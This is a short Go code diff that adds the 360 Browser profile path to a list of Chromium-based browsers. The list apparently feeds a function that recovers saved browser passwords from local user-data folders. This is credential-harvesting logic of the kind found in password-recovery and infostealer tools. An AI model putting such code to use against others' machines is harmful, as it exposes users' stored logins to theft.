@@ -133,6 +133,7 @@ func Recovery_passwords_chromes()(map[string][]Logins_table_struct){
 	browser_map := make(map[string]Browser_info)
 	browser_map["Vivaldi"] = Browser_info{Browser_path:Local_appdata+"\\Vivaldi\\User Data",Need_or_not_to_recovery:true}
 	browser_map["Chrome"] = Browser_info{Browser_path:Local_appdata+"\\Google\\Chrome\\User Data",Need_or_not_to_recovery:true}
+	browser_map["360 Browser"] = Browser_info{Browser_path:Local_appdata+"\\360Chrome\\Chrome\\User Data",Need_or_not_to_recovery:true}
 
 
 	result_map := make(map[string][]Logins_table_struct)
